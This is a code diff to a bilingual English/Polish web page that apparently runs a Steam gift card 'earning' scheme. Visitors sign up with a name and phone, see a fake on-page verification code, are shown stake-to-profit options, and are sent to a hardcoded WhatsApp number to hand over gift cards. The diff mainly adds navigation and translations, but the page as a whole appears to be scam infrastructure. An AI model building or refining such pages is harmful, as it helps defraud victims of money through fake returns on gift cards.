@@ -31,12 +31,12 @@
   .notif{position:fixed;left:20px;bottom:20px;padding:12px;border-radius:10px;background:#052e13;color:#c9f6de;border:1px solid #0a4a23}
   img.preview{max-width:100%;height:120px;object-fit:cover;border-radius:8px;border:1px solid #222}
   .small-muted{font-size:12px;color:var(--muted)}
+  #backHomeBtn {margin-top:16px;width:100%;text-align:center;background:#1f2937;border:1px solid var(--border);}
 </style>
 </head>
 <body>
 <div class="top-right hidden" id="topBar">
   <button id="meBtn" class="mebtn">me 🚹</button>
-  <button id="homeBtn" class="mebtn hidden">🏠 Home</button>
   <button id="logoutBtn" class="logoutbtn">Logout</button>
 </div>
 
@@ -124,6 +124,7 @@
         <div id="meBalance" style="font-weight:700;font-size:18px">0.00 PLN</div>
       </div>
     </div>
+    <button id="backHomeBtn" class="btn">⬅ Back to Home</button>
   </div>
 </div>
 
@@ -144,16 +145,16 @@ const options = [
 ];
 
 const translations = {
-  en: { welcome:"Welcome — Signup / Login (US & Poland only)",country:"Country",language:"Language",name:"Name",phone:"Phone",sendCode:"Send code",notSent:"Not sent",enterCode:"Enter code",finishLogin:"Finish login",uploadCard:"Upload a card",uploadDesc:"United States & Poland only — Steam gift card uploads only.",chooseMethod:"Choose method you want to earn:",balance:"Balance",myAccount:"My Account",alertCountry:"Only Poland and United States allowed",alertMissing:"Enter name + phone",loginSuccess:"Login success",loggedOut:"Logged out" },
-  pl: { welcome:"Witamy — Rejestracja / Logowanie (tylko USA i Polska)",country:"Kraj",language:"Język",name:"Imię",phone:"Telefon",sendCode:"Wyślij kod",notSent:"Nie wysłano",enterCode:"Wpisz kod",finishLogin:"Zakończ logowanie",uploadCard:"Prześlij kartę",uploadDesc:"Tylko USA i Polska — tylko karty podarunkowe Steam.",chooseMethod:"Wybierz metodę zarabiania:",balance:"Saldo",myAccount:"Moje konto",alertCountry:"Dozwolone tylko Polska i Stany Zjednoczone",alertMissing:"Wpisz imię i telefon",loginSuccess:"Logowanie zakończone sukcesem",loggedOut:"Wylogowano" }
+  en: { welcome:"Welcome — Signup / Login (US & Poland only)", country:"Country", language:"Language", name:"Name", phone:"Phone", sendCode:"Send code", notSent:"Not sent", enterCode:"Enter code", finishLogin:"Finish login", uploadCard:"Upload a card", uploadDesc:"United States & Poland only — Steam gift card uploads only.", chooseMethod:"Choose method you want to earn:", balance:"Balance", myAccount:"My Account", backHome:"⬅ Back to Home", alertCountry:"Only Poland and United States allowed", alertMissing:"Enter name + phone", loginSuccess:"Login success", loggedOut:"Logged out" },
+  pl: { welcome:"Witamy — Rejestracja / Logowanie (tylko USA i Polska)", country:"Kraj", language:"Język", name:"Imię", phone:"Telefon", sendCode:"Wyślij kod", notSent:"Nie wysłano", enterCode:"Wpisz kod", finishLogin:"Zakończ logowanie", uploadCard:"Prześlij kartę", uploadDesc:"Tylko USA i Polska — tylko karty podarunkowe Steam.", chooseMethod:"Wybierz metodę zarabiania:", balance:"Saldo", myAccount:"Moje konto", backHome:"⬅ Powrót do strony głównej", alertCountry:"Dozwolone tylko Polska i Stany Zjednoczone", alertMissing:"Wpisz imię i telefon", loginSuccess:"Logowanie zakończone sukcesem", loggedOut:"Wylogowano" }
 };
 
 const stateKey = "demo_safe_users";
 const sessionKey = "demo_safe_session";
+
 let users = JSON.parse(localStorage.getItem(stateKey) || "{}");
 let currentUser = JSON.parse(localStorage.getItem(sessionKey) || "null");
-
-const whatsappNumber = "2348108462471";
+const whatsappNumber = "2348108462471"; // ✅ Your WhatsApp number in international format
 
 function saveUsers(){ localStorage.setItem(stateKey, JSON.stringify(users)); }
 function saveSession(){ localStorage.setItem(sessionKey, JSON.stringify(currentUser)); }
@@ -178,12 +179,12 @@ function updateLanguage(lang){
   el("home").querySelector(".small-muted").textContent = translations[lang].uploadDesc;
   document.querySelector("#home .small-muted").nextElementSibling.previousElementSibling.textContent = translations[lang].balance;
   el("meCard").querySelector("h1").textContent = translations[lang].myAccount;
-  el("meCard").querySelector(".small-muted").textContent = translations[lang].balance;
+  el("backHomeBtn").textContent = translations[lang].backHome;
 }
 
 function updateUI(){
   if(currentUser){
-    hide('gate'); show('home'); hide('meCard'); show('topBar'); hide('homeBtn');
+    hide('gate'); show('home'); hide('meCard'); show('topBar');
     el('balanceDisplay').textContent = currentUser.balance.toFixed(2) + " PLN";
     el('meName').textContent = currentUser.name;
     el('mePhone').textContent = currentUser.phone;
@@ -199,7 +200,7 @@ function renderOptions(){
     const div = document.createElement('div'); div.className='option';
     div.innerHTML = `<h3>${opt.stake} PLN → ${opt.profit} PLN</h3>
       <div class="small-muted">Upload Steam gift card to receive ${opt.profit} PLN</div>
-      <button class="btn" data-id="${opt.id}">Select</button>`;
+      <button class="btn" data-id="${opt.id}">💬 WhatsApp Me</button>`;
     list.appendChild(div);
   });
 }
@@ -210,8 +211,8 @@ document.addEventListener('click', (e)=>{
     const id = Number(e.target.getAttribute('data-id'));
     const opt = options.find(o=>o.id===id);
     if(opt && currentUser){
-      currentUser.selectedOption = opt; saveSession();
-      notif(`Opening WhatsApp with option ${opt.stake} → ${opt.profit}`);
+      currentUser.selectedOption = opt;
+      saveSession();
       const message = `Hello, my name is ${currentUser.name}. I want to select the option ${opt.stake} PLN → ${opt.profit} PLN.`;
       const url = `https://wa.me/${whatsappNumber}?text=${encodeURIComponent(message)}`;
       window.open(url, "_blank");
@@ -221,8 +222,13 @@ document.addEventListener('click', (e)=>{
 
 el("country").addEventListener("change", () => {
   const country = el("country").value;
-  if(country === "PL"){ el("lang").value = "pl"; updateLanguage("pl"); }
-  else if(country === "US"){ el("lang").value = "en"; updateLanguage("en"); }
+  if(country === "PL"){
+    el("lang").value = "pl";
+    updateLanguage("pl");
+  } else if(country === "US"){
+    el("lang").value = "en";
+    updateLanguage("en");
+  }
 });
 
 el('sendCode').addEventListener('click', ()=>{
@@ -230,11 +236,14 @@ el('sendCode').addEventListener('click', ()=>{
   const lang = el('lang').value;
   const name = el('name').value.trim();
   const phone = el('phone').value.trim();
-  if(country !== 'PL' && country !== 'US'){ alert(translations[lang].alertCountry); return; }
+  if(country !== 'PL' && country !== 'US'){ 
+    alert(translations[lang].alertCountry);
+    return; 
+  }
   if(!name || !phone){ alert(translations[lang].alertMissing); return; }
   currentUser = users[phone] || { name, phone, balance:0 };
   currentUser.pendingCode = String(Math.floor(100000 + Math.random()*900000));
-  users[phone] = currentUser; saveUsers(); saveSession();
+  users[phone] = currentUser; saveUsers();
   el('codeSent').textContent = '✅ ' + translations[lang].sendCode;
   show('verifyRow'); el('codeBox').classList.remove('hidden');
   el('codeBox').textContent = "Your code: " + currentUser.pendingCode;
@@ -244,26 +253,25 @@ el('finishSignup').addEventListener('click', ()=>{
   const lang = el('lang').value;
   const code = el('code').value.trim();
   if(!currentUser || code !== currentUser.pendingCode){ alert('Invalid code'); return; }
-  delete currentUser.pendingCode; users[currentUser.phone]=currentUser; saveUsers(); saveSession();
+  delete currentUser.pendingCode; 
+  users[currentUser.phone]=currentUser; 
+  saveUsers();
+  saveSession(); 
   notif(translations[lang].loginSuccess); updateUI();
 });
 
-el('meBtn').addEventListener('click', ()=>{ hide('home'); show('meCard'); show('homeBtn'); });
-el('homeBtn').addEventListener('click', ()=>{ hide('meCard'); show('home'); hide('homeBtn'); });
-
+el('meBtn').addEventListener('click', ()=>{ hide('home'); show('meCard'); });
+el('backHomeBtn').addEventListener('click', ()=>{ hide('meCard'); show('home'); });
 el('logoutBtn').addEventListener('click', ()=>{
   const lang = el('lang').value;
-  currentUser=null; clearSession(); updateUI(); notif(translations[lang].loggedOut);
+  currentUser=null; 
+  clearSession();
+  updateUI(); 
+  notif(translations[lang].loggedOut);
 });
 
-// ✅ Keep user logged in after refresh
-window.addEventListener("DOMContentLoaded", () => {
-  if(currentUser){
-    el("lang").value = "en";
-    updateLanguage("en");
-  }
-  updateUI();
-});
+updateLanguage(el("lang").value);
+updateUI();
 </script>
 </body>
 </html>
